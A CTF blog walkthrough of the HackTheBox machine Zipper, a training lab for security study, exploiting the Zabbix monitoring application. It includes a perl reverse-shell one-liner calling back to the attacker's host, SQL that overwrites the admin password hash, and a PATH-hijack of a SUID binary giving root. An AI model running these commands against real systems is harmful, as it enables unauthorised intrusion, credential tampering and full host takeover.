---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2019-02-22-zipper-hackthebox
tags:
- hackthebox
- linux
- zabbix
title: Zipper @ HackTheBox
---

This post is a walkthrough of Zipper, an interesting machine on [hackthebox.eu](https://www.hackthebox.eu) featuring the zabbix network monitoring application. It involves the application of known zabbix exploits, manipulation of database entries and light custom exploitation of a privileged binary.

## User & Root Flag

The initial scan (`nmap -Pn -n -sC -sV -p- 10.10.10.108 -oA 10.10.10.108`) shows the following results:

```
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)
|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)
|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)
80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10050/tcp open  tcpwrapped
```

A first look on port 80 shows just a default apache2 installation website so we look for more web content with gobuster:

```
gobuster -u http://10.10.10.108 -w ~/tools/SecLists/Discovery/Web-Content/quickhits.txt
```

Running for a few seconds shows that a directory named zabbix exists:

![](htb_zipper_zabbix.png)

Trying some default credentials we eventually enter `zapper:zapper` which does work, but gives the error ‘GUI Access disabled’. This suggests there might be some way to interact with the service without actually using the gui.

A quick google search reveals that there is an API that can be used to talk to zabbix. An important information to get out of zabbix is which hosts it is monitoring. The following short python program connects to the API and prints the configured host ids:

```
from pyzabbix import ZabbixAPI

zapi = ZabbixAPI("http://10.10.10.108/zabbix")
zapi.login("Zapper", "zapper")
print("Connected to Zabbix API Version %s" % zapi.api_version())
for h in zapi.host.get(output="extend"):
    print(h['hostid'])
```

Result:

```
Connected to Zabbix API Version 3.0.21
10105
10106
```

Looking for public exploits with searchsploit we find 39937.py which needs a host id to exploit the application. Since we now do have these ids we can use them if we change the path, ip, credentials and hostid in the exploit code. Running the modified exploit gives a command shell:

```
[zabbix_cmd]>>:  whoami
zabbix
[zabbix_cmd]>>:  id
uid=103(zabbix) gid=104(zabbix) groups=104(zabbix)
```

Since this shell is missing features and convenience we upgrade to a perl reverse tcp shell:

```
perl -e 'use Socket;$i="10.10.14.18";$p=8000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Looking around on the host we find "/usr/lib/zabbix/externalscripts/backup\_script.sh":

```
#!/bin/bash
# zapper wanted a way to backup the zabbix scripts so here it is:
7z a /backups/zabbix_scripts_backup-$(date +%F).7z -pZippityDoDah /usr/lib/zabbix/externalscripts/* &>/dev/null
```

In `/backups` we see 2 backup files:

```
zabbix_scripts_backup-2019-02-22.7z
zapper_backup-2019-02-22.7z
```

We can unpack `zabbix_scripts_backup-2019-02-22.7z` with the password from the script but it just contains the backup\_script.sh itself so it wont help much at this point.

Another interesting file is `/etc/zabbix/web/zabbix.conf.php`:

```
...
DBUser=zabbix
DBName=zabbixdb
DBPassword=f.YMeMd$pTbpY3-449
...
```

With these credentials we can connect to the database and dump the users and their hashes with the following query:

```
mysql -u zabbix -p'f.YMeMd$pTbpY3-449' -D zabbixdb -e "select name, alias, passwd from users; > out.txt"
```

```
Zabbix  Admin 65e730e044402ef2e2f386a18ec03c72
guest d41d8cd98f00b204e9800998ecf8427e
zapper  zapper  16a7af0e14037b567d7782c4ef1bdeda
```

Since cracking the admin password didn’t give any immediate results we change the password of the admin user to something we know:

```
mysql -u zabbix -p'f.YMeMd$pTbpY3-449' -D zabbixdb -e "update users set passwd=md5('xct') where alias='Admin';" > out.txt
```

In addition we want to enable the gui access to see what we can do in the app:

```
mysql -u zabbix -p'f.YMeMd$pTbpY3-449' -D zabbixdb -e "update usrgrp set gui_access = 1 where name = 'administrators';" > out.txt
```

![](htb_zipper_admin_1.png)

Looking at zabbix [docs](https://www.zabbix.com/documentation/3.2/manual/web_interface/frontend_sections/administration/scripts) we see that we can start scripts on the configured hosts. As seen before with the host ids we can see here again that it is indeed 2 different hosts:

```
Zabbix 127.0.0.1: 10050      
Zipper 172.17.0.1: 10050
```

We see in the scripts section that this is basically what the exploit has been doing all along:

![](htb_zipper_admin_2.png)

On this [url](http://10.10.10.108/zabbix/tr_status.php?fullscreen=0&groupid=2&hostid=0&show_triggers=2&ack_status=1&show_events=1&show_severity=0&txt_select=&application=&inventory%5B0%5D%5Bfield%5D=type&inventory%5B0%5D%5Bvalue%5D=&filter_set=Filter]) we can execute these scripts by clicking on the hostname.

However one detail is still missing. The scripts will be executed on the "server"-side, which means no matter which host we execute it on, it will be executed on the server. By changing it to "agent" and executing it we can actually get a shell on zapper:

![](htb_zipper_script_on_agent.png)

```
$ id
uid=107(zabbix) gid=113(zabbix) groups=113(zabbix)
$ ifconfig
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:2aff:fe9c:e446  prefixlen 64  scopeid 0x20<link>
        ether 02:42:2a:9c:e4:46  txqueuelen 0  (Ethernet)
        RX packets 67919  bytes 5366647 (5.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 68574  bytes 5135469 (5.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

One of the first things on a new host is to look for suid binaries with `find / -perm -u=s -type f 2>/dev/null`, which returns the suid program `/home/zapper/utils/zabbix-service`, which happens to be a 32-bit ELF executable.

Executing the file prints the string `start or stop?:` and is waiting for user input. With `strings -n8 /home/zapper/utils/zabbix-service` we find the following strings inside the binary, which are the commands it actually executes:

```
systemctl daemon-reload && systemctl start zabbix-agent
systemctl stop zabbix-agent
```

Since it doesn’t use the absolute path for systemctl we can abuse that to run our own code and get root! Placing a script called systemctl at the location where we are running the tool will execute it in the context of root. We use it to get a root shell, grab user and root flags and are done with the box:

```
echo '#!/bin/bash' > /tmp/systemctl
echo '/bin/bash' >> /tmp/systemctl
chmod +x /tmp/systemctl
export PATH=/tmp:$PATH
/home/zapper/utils/zabbix-service start
```

`uid=0(root) gid=0(root) groups=0(root),113(zabbix)`